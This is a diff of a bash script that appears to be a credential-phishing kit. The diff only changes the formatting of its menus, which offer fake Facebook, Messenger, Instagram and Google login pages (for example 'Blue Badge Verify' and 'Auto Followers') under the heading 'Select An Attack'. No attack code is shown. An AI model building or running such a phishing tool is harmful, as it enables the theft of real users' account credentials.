@@ -169,6 +169,7 @@ about() {
 	cat <<- EOF
 		${RED}Author   ${RED}:  ${ORANGE}NIGHTHAWK ${RED}[ ${ORANGE}N16H7H4WK ${RED}]
 		${RED}Github   ${RED}:  ${RED}https://github.com/Nighthawk-N16H7H4WK
+
 		${GREEN}[${GREEN}0${GREEN}]${GREEN} Main Menu     ${GREEN}[${GREEN}9${GREEN}]${RED} Exit
 	EOF
 
@@ -280,7 +281,9 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook Login Page
+
 		${RED}[${WHITE}02${RED}]${ORANGE} Voting Poll Login Page
+
 		${RED}[${WHITE}03${RED}]${ORANGE} Messenger Login Page
 	EOF
 
@@ -308,11 +311,13 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+
 		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
+
 		${RED}[${WHITE}03${RED}]${ORANGE} Blue Badge Verify Login Page
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "\n${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="instagram"
@@ -363,10 +368,8 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook     ${RED}[${WHITE}02${RED}]${ORANGE} Instagram  
 
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}02${RED}]${ORANGE} Instagram 
-  
 ${RED}[${WHITE}03${RED}]${ORANGE} Google   
 
 		${RED}[${WHITE}9${RED}]${ORANGE} About         ${RED}[${WHITE}0${RED}]${RED} Exit
